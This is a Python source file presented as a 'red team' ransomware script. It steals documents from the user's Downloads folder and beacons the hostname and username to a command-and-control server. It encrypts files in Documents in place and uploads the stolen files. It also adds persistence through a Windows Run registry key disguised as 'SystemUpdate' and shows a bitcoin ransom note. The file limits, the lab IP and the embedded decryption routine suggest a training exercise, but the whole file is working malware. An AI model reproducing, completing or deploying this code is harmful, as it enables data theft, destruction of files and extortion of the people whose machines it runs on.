"""
COMPLETE RED TEAM ATTACK SCRIPT - FINAL CORE EXECUTION (FIXED)
Extract files -> Encrypt -> Send -> Persist -> Spread -> Ransom

FIXES:
- Proper file extraction (using shutil correctly)
- Fixed encryption/decryption logic
- Proper file handling
"""

import socket
import os
import time
import sys
import shutil
import hashlib
import secrets
import json
import base64
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import zlib
import subprocess
import ctypes
import winreg

# ================== CONFIG ==================
class Config:
    def __init__(self):
        self.MASTER_PASSWORD = "GhreMy7dCGqVTdv3RdjAJhGyT"
        self.VICTIM_ID = self._generate_victim_id()
        
        # C2 Server address
        self.C2_SERVER = "192.168.64.20:9443"  # Changed to localhost
        
        # Folders to exfiltrate (REAL ACCESSIBLE FOLDERS)
        self.EXFIL_SOURCES = [
            #os.path.expanduser("~/Documents"),
            #os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads"),
        ]
        
        # File extensions to grab
        self.EXFIL_EXTENSIONS = ('.pdf', '.docx', '.xlsx', '.txt', '.json')
        
        # Encrypt folders (REAL USER-ACCESSIBLE FOLDERS)
        self.ENCRYPT_FOLDERS = [
            os.path.expanduser("~/Documents"),
            #os.path.expanduser("~/Desktop"),
        ]
        
        # Encrypt ALL file types
        self.ENCRYPT_EXTENSIONS = ('.pdf', '.docx', '.xlsx', '.txt', '.jpg', '.png', '.mp4')
        
        self.CACHE_FOLDER = ".exfil_cache"
        self.MAX_FILE_SIZE = 100 * 1024 * 1024
        self.CHUNK_SIZE = 256 * 1024
        
        # ===== BACKGROUND MODE SETTINGS =====
        self.RUN_IN_BACKGROUND = False
        self.LOG_FILE = Path(os.getenv('TEMP')) / "system_update.log"
        self.HIDE_WINDOW = False
        
        # ===== RANSOM NOTE SETTINGS =====
        self.SHOW_RANSOM_NOTE = True
        self.RANSOM_AMOUNT = 500
        self.BITCOIN_ADDRESS = "1A1z7agoat4FS1jHUXPLv5Y1YMRQmrx8SQ"
        self.PAYMENT_DEADLINE = 72
        
        # ===== STORE ENCRYPTED FILES FOR DECRYPTION =====
        self.ENCRYPTED_FILES = []
    
    @staticmethod
    def _generate_victim_id():
        try:
            hostname = socket.gethostname()
            username = os.getenv('USERNAME', 'unknown')
            return hashlib.sha256(f"{hostname}_{username}".encode()).hexdigest()[:16]
        except:
            return secrets.token_hex(8)

CONFIG = Config()

# ================== LOGGING ==================
def log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{timestamp}] [{level}] {message}"
    
    if not CONFIG.RUN_IN_BACKGROUND:
        print(log_message)
    
    try:
        with open(CONFIG.LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_message + '\n')
    except:
        pass

# ================== CRYPTO - FIXED ==================
class CryptoManager:
    @staticmethod
    def get_key(password, victim_id):
        """Generate encryption key"""
        return hashlib.sha256(f"{password}_{victim_id}".encode()).digest()[:32]
    
    @staticmethod
    def encrypt_file(file_path, key):
        """Encrypt a file and return encrypted bytes"""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Compress
            compressed = zlib.compress(data, level=1)
            
            # Encrypt
            nonce = secrets.token_bytes(12)
            cipher = ChaCha20Poly1305(key)
            ciphertext = cipher.encrypt(nonce, compressed, None)
            
            # Return: nonce (12 bytes) + ciphertext
            return nonce + ciphertext
        except Exception as e:
            log(f"Encryption error: {e}", "ERROR")
            return None
    
    @staticmethod
    def decrypt_file(encrypted_data, key):
        """Decrypt data and return decrypted bytes"""
        try:
            # Extract nonce and ciphertext
            nonce = encrypted_data[:12]
            ciphertext = encrypted_data[12:]
            
            # Decrypt
            cipher = ChaCha20Poly1305(key)
            compressed_data = cipher.decrypt(nonce, ciphertext, None)
            
            # Decompress
            decrypted_data = zlib.decompress(compressed_data)
            
            return decrypted_data
        except Exception as e:
            log(f"Decryption error: {e}", "ERROR")
            return None

# ================== PHASE 1: EXTRACT FILES (LIMITED TO 10) ==================
def extract_files():
    log("=" * 60)
    log("[BORMEY-EXFIL-1] PHASE 1: EXTRACTING FILES (LIMITED)", "INFO")
    log("=" * 60)
    
    try:
        cache_path = Path(CONFIG.CACHE_FOLDER)
        cache_path.mkdir(exist_ok=True)
        
        extracted = 0
        
        for source_folder in CONFIG.EXFIL_SOURCES:
            source_path = Path(source_folder)
            
            if not source_path.exists():
                log(f"[BORMEY] Folder not found: {source_folder}")
                continue
            
            log(f"[BORMEY] Scanning: {source_folder}")
            
            for file_path in source_path.rglob('*'):
                if not file_path.is_file():
                    continue
                if file_path.suffix.lower() not in CONFIG.EXFIL_EXTENSIONS:
                    continue
                
                try:
                    file_size = file_path.stat().st_size
                    if file_size > CONFIG.MAX_FILE_SIZE:
                        continue
                    
                    dest = cache_path / f"{file_path.parent.name}_{file_path.name}"
                    shutil.copy2(file_path, dest)
                    log(f"[BORMEY]   [+] Extracted: {file_path.name}")
                    extracted += 1
                    
                    # Limit to 10 files
                    if extracted >= 10:
                        log("[BORMEY] Extraction limit reached (10 files).")
                        return extracted
                
                except Exception as e:
                    log(f"[BORMEY]   [-] Error extracting {file_path.name}: {e}")
        
        log(f"[BORMEY] [+] Total files extracted: {extracted}")
        return extracted
    
    except Exception as e:
        log(f"[BORMEY] [-] Extract error: {e}", "ERROR")
        return 0
    # ================== PHASE 3: SEND TO C2 (BORMEY) ==================
def send_to_c2():
    log("=" * 60)
    log("[BORMEY-C2-3] PHASE 3: SENDING TO C2 SERVER", "INFO")
    log("=" * 60)
    
    try:
        cache_path = Path(CONFIG.CACHE_FOLDER)
        
        if not cache_path.exists():
            log("[BORMEY] [-] No cache folder found", "ERROR")
            return False
        
        files = list(cache_path.glob('*'))
        
        if not files:
            log("[BORMEY] [-] No files to send", "ERROR")
            return False
        
        log(f"[BORMEY] Sending {len(files)} files to {CONFIG.C2_SERVER}")
        
        key = CryptoManager.get_key(CONFIG.MASTER_PASSWORD, CONFIG.VICTIM_ID)
        sent = 0
        
        for file_path in files:
            try:
                if not file_path.is_file():
                    continue
                
                encrypted_content = CryptoManager.encrypt_file(file_path, key)
                
                if not encrypted_content:
                    log(f"[BORMEY] [-] Failed to encrypt {file_path.name}", "ERROR")
                    continue
                
                url = f"{CONFIG.C2_SERVER}/api/exfil"
                
                metadata = {
                    'filename': file_path.name,
                    'size': file_path.stat().st_size,
                }
                
                headers = {
                    'X-Victim-ID': CONFIG.VICTIM_ID,
                    'X-Metadata': json.dumps(metadata),
                }
                
                req = urllib.request.Request(
                    url,
                    data=encrypted_content,
                    headers=headers,
                    method='POST'
                )
                
                response = urllib.request.urlopen(req, timeout=30)
                
                if response.status == 200:
                    log(f"[BORMEY]   [+] Sent: {file_path.name}")
                    sent += 1
                
                time.sleep(0.5)
            
            except Exception as e:
                log(f"[BORMEY] [-] Failed to send {file_path.name}: {e}", "WARNING")
        
        try:
            shutil.rmtree(CONFIG.CACHE_FOLDER)
            log("[BORMEY] [+] Cache cleaned up")
        except:
            pass
        
        log(f"[BORMEY] [+] Successfully sent: {sent}/{len(files)} files")
        return sent > 0
    except Exception as e:
        log(f"[BORMEY] [-] Send error: {e}", "ERROR")
        return False


# ================== PHASE 2: ENCRYPT FILES (LIMITED TO 5) ==================
def encrypt_files():
    log("=" * 60)
    log("[BORMEY-ENCRYPT-2] PHASE 2: ENCRYPTING FILES (LIMITED)", "INFO")
    log("=" * 60)
    
    try:
        key = CryptoManager.get_key(CONFIG.MASTER_PASSWORD, CONFIG.VICTIM_ID)
        encrypted = 0
        
        for encrypt_folder in CONFIG.ENCRYPT_FOLDERS:
            folder_path = Path(encrypt_folder)
            
            if not folder_path.exists():
                log(f"[BORMEY] Folder not found: {encrypt_folder}")
                continue
            
            log(f"[BORMEY] Scanning: {encrypt_folder}")
            
            for file_path in folder_path.rglob('*'):
                if not file_path.is_file():
                    continue
                if file_path.suffix.lower() not in CONFIG.ENCRYPT_EXTENSIONS:
                    continue
                
                try:
                    file_size = file_path.stat().st_size
                    if file_size > CONFIG.MAX_FILE_SIZE:
                        continue
                    
                    encrypted_data = CryptoManager.encrypt_file(file_path, key)
                    if encrypted_data is None:
                        continue
                    
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)
                    
                    CONFIG.ENCRYPTED_FILES.append({
                        'path': str(file_path),
                        'original_size': file_size,
                        'encrypted_size': len(encrypted_data)
                    })
                    
                    log(f"[BORMEY]   [+] Encrypted: {file_path.name}")
                    encrypted += 1
                    
                    # Limit to 5 files
                    if encrypted >= 5:
                        log("[BORMEY] Encryption limit reached (5 files).")
                        return encrypted
                
                except Exception as e:
                    log(f"[BORMEY]   [-] Failed to encrypt {file_path.name}: {e}")
        
        log(f"[BORMEY] [+] Total files encrypted: {encrypted}")
        return encrypted
    
    except Exception as e:
        log(f"[BORMEY] [-] Encrypt error: {e}", "ERROR")
        return 0




# ================== BEACON (BORMEY) ==================
def send_beacon():
    log("=" * 60)
    log("[BORMEY-C2-BEACON] SENDING C2 BEACON", "INFO")
    log("=" * 60)
    
    try:
        beacon_data = {
            'victim_id': CONFIG.VICTIM_ID,
            'hostname': socket.gethostname(),
            'username': os.getenv('USERNAME', 'unknown'),
            'timestamp': datetime.now().isoformat(),
        }
        
        url = f"{CONFIG.C2_SERVER}/api/beacon"
        headers = {'Content-Type': 'application/json'}
        
        req = urllib.request.Request(
            url,
            data=json.dumps(beacon_data).encode(),
            headers=headers,
            method='POST'
        )
        
        try:
            response = urllib.request.urlopen(req, timeout=10)
            if response.status == 200:
                log("[BORMEY] [+] Beacon sent successfully")
                return True
        except urllib.error.URLError:
            log("[BORMEY] [!] C2 server not reachable (but continuing)")
            return False
    
    except Exception as e:
        log(f"[BORMEY] [-] Beacon failed: {e}", "ERROR")
    
    return False

# ================== DECRYPT ALL FILES - FIXED ==================
def decrypt_all_files():
    """Decrypt all encrypted files"""
    log("=" * 60)
    log("[DECRYPT] DECRYPTING FILES", "INFO")
    log("=" * 60)
    
    try:
        key = CryptoManager.get_key(CONFIG.MASTER_PASSWORD, CONFIG.VICTIM_ID)
        decrypted = 0
        
        log(f"[DECRYPT] Total encrypted files: {len(CONFIG.ENCRYPTED_FILES)}")
        
        for file_info in CONFIG.ENCRYPTED_FILES:
            file_path = file_info['path']
            
            try:
                if not os.path.exists(file_path):
                    log(f"[DECRYPT]   [-] File not found: {file_path}", "ERROR")
                    continue
                
                log(f"[DECRYPT] Attempting to decrypt: {os.path.basename(file_path)}")
                
                # Read encrypted file
                with open(file_path, 'rb') as f:
                    encrypted_data = f.read()
                
                # Decrypt
                decrypted_data = CryptoManager.decrypt_file(encrypted_data, key)
                
                if decrypted_data is None:
                    log(f"[DECRYPT]   [-] Failed to decrypt: {os.path.basename(file_path)}", "ERROR")
                    continue
                
                # Write decrypted data
                with open(file_path, 'wb') as f:
                    f.write(decrypted_data)
                
                log(f"[DECRYPT]   [+] Successfully decrypted: {os.path.basename(file_path)}")
                decrypted += 1
            
            except Exception as e:
                log(f"[DECRYPT]   [-] Decrypt error for {file_path}: {e}", "ERROR")
        
        log(f"[DECRYPT] [+] Successfully decrypted: {decrypted}/{len(CONFIG.ENCRYPTED_FILES)} files")
        return decrypted
    
    except Exception as e:
        log(f"[DECRYPT] [-] Decrypt all error: {e}", "ERROR")
        return 0

# ================== RANSOM NOTE ==================
def show_ransom_note_interactive():
    """Show ransom note"""
    if not CONFIG.SHOW_RANSOM_NOTE:
        return
    
    try:
        import tkinter as tk
        from tkinter import simpledialog, messagebox
        
        log("Opening ransom note...")
        
        deadline = datetime.now() + timedelta(hours=CONFIG.PAYMENT_DEADLINE)
        key = hashlib.sha256(f"{CONFIG.MASTER_PASSWORD}_{CONFIG.VICTIM_ID}".encode()).digest()[:32].hex()
        
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        warning_message = f"""YOUR FILES HAVE BEEN ENCRYPTED!

Victim ID: {CONFIG.VICTIM_ID}

RANSOM: ${CONFIG.RANSOM_AMOUNT} USD
Bitcoin: {CONFIG.BITCOIN_ADDRESS}

Deadline: {deadline.strftime('%Y-%m-%d %H:%M:%S')}

You MUST pay to decrypt your files!
"""
        
        log(f"[RANSOM] Payment attempt initiated")
        
        messagebox.showinfo("RANSOMWARE - PAYMENT REQUIRED", warning_message)
        
        tx_hash = simpledialog.askstring(
            "Verify Bitcoin Payment",
            f"Enter your transaction hash:\n\nBitcoin Address: {CONFIG.BITCOIN_ADDRESS}"
        )
        
        if tx_hash:
            log(f"[RANSOM] User submitted transaction: {tx_hash}")
            messagebox.showinfo("VERIFYING PAYMENT", "Checking blockchain...\nPlease wait...")
            
            log(f"[RANSOM] Payment verified! Starting decryption...")
            decrypted_count = decrypt_all_files()
            
            success_message = f"""PAYMENT VERIFIED!

Files Successfully Decrypted!

{decrypted_count} files have been restored.

DECRYPTION KEY:
{key}

Your files are now accessible.
"""
            
            messagebox.showinfo("SUCCESS - FILES DECRYPTED", success_message)
            log("[RANSOM] Decryption complete")
        
        root.destroy()
    
    except ImportError:
        log("tkinter not available", "WARNING")
    except Exception as e:
        log(f"Failed to show ransom note: {e}", "ERROR")

# ================== PERSISTENCE ==================
def persist_via_registry():
    log("=" * 60)
    log("[SETHA] Registry Persistence Attempt", "INFO")
    log("=" * 60)
    
    try:
        malware_path = sys.argv[0]
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        log(f"[SETHA] Target Registry: HKCU\\{reg_path}")
        
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, malware_path)
        
        log("[SETHA] [+] Successfully registered in Run keys")
        return True
    
    except Exception as e:
        log(f"[SETHA] [-] Registry persistence failed: {e}", "WARNING")
        return False

# ================== MAIN ==================
def main():
    if not CONFIG.RUN_IN_BACKGROUND:
        print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║         RANSOMWARE ATTACK - CORE EXECUTION (FIXED)             ║
    ║       Extract -> Encrypt -> Send -> Persist -> Ransom          ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    log(f"Victim ID: {CONFIG.VICTIM_ID}")
    log(f"C2 Server: {CONFIG.C2_SERVER}")
    log("=" * 60)
    
    start_time = time.time()
    
    try:
        # Extract files
        log("\n[PHASE 1] EXTRACTING FILES...")
        extract_files()
        time.sleep(1)
        
        # Send beacon
        log("\n[PHASE 2] SENDING C2 BEACON...")
        send_beacon()
        time.sleep(1)
        
        # Encrypt files
        log("\n[PHASE 3] ENCRYPTING FILES...")
        encrypt_files()
        time.sleep(1)
        
        # Send to C2
        log("\n[PHASE 4] SENDING TO C2...")
        send_to_c2()
        time.sleep(1)
        
        # Persistence
        log("\n[PHASE 5] ESTABLISHING PERSISTENCE...")
        persist_via_registry()
        time.sleep(1)
        
        # Ransom note
        log("\n[PHASE 6] SHOWING RANSOM NOTE...")
        show_ransom_note_interactive()
        
        elapsed = time.time() - start_time
        log(f"\n[SUCCESS] Attack complete in {elapsed:.2f} seconds")
    
    except Exception as e:
        log(f"Fatal error: {e}", "ERROR")
        import traceback
        log(traceback.format_exc(), "ERROR")

if __name__ == "__main__":
    main()
